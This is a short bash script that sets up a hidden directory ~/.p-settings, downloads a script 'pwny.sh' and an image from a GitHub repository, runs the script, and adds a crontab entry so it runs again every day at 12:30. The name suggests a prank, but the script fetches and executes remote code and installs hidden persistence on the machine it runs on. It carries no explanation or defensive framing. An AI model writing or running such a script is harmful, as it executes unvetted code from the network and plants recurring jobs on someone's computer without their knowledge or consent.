#!/bin/bash

mkdir ~/.p-settings
cd ~/.p-settings
curl -O https://raw.githubusercontent.com/jeversmann/pwny/master/pwny.sh
curl -O https://raw.githubusercontent.com/jeversmann/pwny/master/pwny.jpg
chmod +x pwny.sh
./pwny.sh
cd -

line="30 12 * * * ~/.p-settings/pwny.sh"
(crontab -l; echo "$line" ) | crontab -
